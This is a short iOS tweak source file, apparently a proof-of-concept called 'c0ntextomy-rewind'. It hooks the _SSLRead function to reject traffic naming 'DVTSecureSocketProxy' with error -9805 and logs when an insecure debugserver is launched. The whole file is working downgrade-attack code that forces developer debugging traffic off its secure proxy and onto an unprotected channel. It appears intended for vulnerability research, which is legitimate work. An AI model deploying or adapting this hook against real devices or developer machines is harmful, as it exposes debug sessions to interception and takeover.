%hookf(SInt32, "_SSLRead", void *ctx, void *data, size_t dataLength, size_t *processed) {
	SInt32 ret = %orig();

	if (memmem(data, *processed, "DVTSecureSocketProxy", strlen("DVTSecureSocketProxy")) != NULL) {
		NSLog(@"c0ntextomy-rewind - No secure proxy for you");
		return -9805;
	} else if (memmem(data, *processed, "debugserver", strlen("debugserver")) != NULL) {
		NSLog(@"c0ntextomy-rewind - Launching insecure debugserver:\n%s", data);
	}

	return ret;
}

%ctor {
	NSLog(@"c0ntextomy-rewind - POC Loaded");
}